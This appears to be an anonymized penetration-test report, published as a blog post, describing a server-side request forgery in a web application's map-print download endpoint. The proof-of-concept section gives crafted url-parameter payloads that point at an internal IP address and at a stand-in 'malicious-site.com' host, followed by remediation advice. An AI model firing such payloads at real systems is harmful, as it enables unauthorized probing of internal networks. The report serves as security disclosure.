---
layout: post
title: 'IT Company Web Application PT'
tags:
 - web
 - real-activity
hero: https://images.unsplash.com/photo-1462206092226-f46025ffe607?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=1474&q=80
overlay: red
---

Please note that for this proof of concept, while images and step-by-step reproduction tips are fundamental for evidentiary purposes, they will not be supplied. Furthermore, in adherence to our commitment to privacy and compliance with non-disclosure agreements, all URLs and functionalities within this assessment have been anonymized. {: .lead}
 <!--break-->

# IT Company

## Type of activity and objectives
The objective of this engagement was to conduct a web application penetration test for the organization. The aim was to identify potential vulnerabilities that could potentially be exploited from the outside, to prevent unauthorized access, compromise and data exfiltration.
## Scope of evaluation
The evaluation was focused on the exposed web application. This scope encompassed assessing the security and potential vulnerabilities within this surface.
## Executive Summary 
The assessment of the target application identified a Server-Side Request Forgery (SSRF) vulnerability. SSRF is a security vulnerability that allows an attacker to manipulate the server into making unintended network requests to internal or external resources. Exploiting this vulnerability could potentially lead to data exposure, service disruption, and unauthorized access to sensitive information.
## Finding Summary
- SSRF
## Risk Impact Graph with CVSS Scores

![](https://raw.githubusercontent.com/blitz0p3rations/blitz0p3rations.github.io/master/uploads/c7.png)

## Vulnerability Types Distribution

![](https://raw.githubusercontent.com/blitz0p3rations/blitz0p3rations.github.io/master/uploads/c8.png)

## Attack storyline and findings### SSRF
- CVSS Vector: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
#### Proof of Concept (PoC)

1. URL: `.it/maps/api/v1/print/download?url=http%3a%2f%2f10.150.56.238%3a8080%2f`
   
   This URL appears to be susceptible to SSRF. By providing a specially crafted `url` parameter, we can attempt to access internal or external resources.

   Example:
   `.it/maps/api/v1/print/download?url=http://malicious-site.com/malicious-file`

2. URL: `.it/maps/api/v1/print/download?url=https%3a%2f%2f.it%2fgeoserver%2fp_bzAdministrativeUnits`

   Similar to the previous URL, this one is also vulnerable to SSRF. The provided `url` parameter seems to accept URLs as inputs, which can be manipulated to request arbitrary resources.

   Example:
   `.it/maps/api/v1/print/download?url=https://malicious-site.com/malicious-file`

By using the provided URLs and manipulating the `url` parameter, an attacker could attempt to trigger unintended requests to external or internal resources. This vulnerability could potentially lead to unauthorized data access or other security risks. To mitigate this vulnerability, ensure proper input validation, restrict outgoing requests to trusted domains, and follow best practices for SSRF prevention.

#### Remediations
- Input Validation and Whitelisting: Validate and sanitize user-provided input thoroughly before making any external requests. Use whitelists of allowed domains or IP addresses to restrict the destinations of requests.

- Use Proper Libraries: If your application needs to make requests to external resources, use well-maintained libraries or modules that offer built-in protections against SSRF. These libraries might have features like URL validation and restriction.

- Bound IP Ranges and Ports: If possible, configure the server to only allow requests to specific IP ranges or ports. This can help prevent SSRF attacks by restricting where requests can be sent.

- Use DNS Resolution Safeguards: Prevent the SSRF vulnerability by using DNS resolution safeguards, such as forcing DNS resolution through a proxy that only resolves safe domains.

- Avoid User-Controlled URLs: Avoid making requests to URLs provided by users unless necessary. If user-controlled URLs are needed, ensure that they go through rigorous validation and sanitization.

- Network Segmentation: Isolate your application's server from internal systems by using network segmentation. This can prevent SSRF attacks from reaching sensitive internal resources.
